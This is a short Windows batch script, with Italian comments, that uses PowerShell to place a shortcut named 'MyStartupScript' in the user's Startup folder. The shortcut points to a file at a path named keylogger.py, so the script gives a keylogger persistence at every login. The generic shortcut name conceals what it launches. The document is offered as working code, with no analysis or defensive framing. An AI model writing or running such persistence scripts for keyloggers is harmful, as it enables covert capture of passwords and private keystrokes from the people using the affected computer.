@echo off
setlocal

:: Percorso dello script da eseguire
set SCRIPT_PATH=C:\Users\ktgki\Desktop\python_scripts\keylogger\keylogger.py

:: Nome del collegamento
set LINK_NAME=MyStartupScript

:: Percorso della cartella Esecuzione automatica
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Crea il collegamento
echo Creating shortcut in startup folder...
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_FOLDER%\%LINK_NAME%.lnk');$s.TargetPath='%SCRIPT_PATH%';$s.Save()"

echo Script added to startup successfully.
endlocal
